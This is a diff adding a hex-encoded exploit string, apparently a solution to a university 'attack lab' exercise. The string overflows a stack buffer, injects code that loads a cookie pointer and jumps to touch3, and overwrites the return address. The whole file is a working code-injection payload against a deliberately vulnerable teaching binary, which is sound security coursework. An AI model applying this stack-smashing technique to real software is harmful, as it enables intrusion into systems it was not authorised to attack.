@@ -1,0 +1,14 @@
+
+ /* adds cookie to stack does it at start of string */
+31 32 33 34 35 36 37 38 /* adds cookie to stack at start of string */
+bf a8 dc 61 55 /* moves pointer to cookie string to edi */
+68 fa 18 40 00 /* pushes touch3 to stack */
+c3 /* ideally, returns to touch3 */
+30 31 32 33 34 35 36 37 38 39 30 /* fills up space */
+30 31 32 33 34 35 36 37 38 39 /* fills up the stack everything extra is the return address now */
+
+80 dc 61 55 00 00 00 00  /* Return redirect */
+35 39 62 39 39 37 66 61 /* adds cookie to stack at start of string */
+
+/* (stack at 0x5561dca0 at the end) 
+(touch 2 at )0x004017ec */
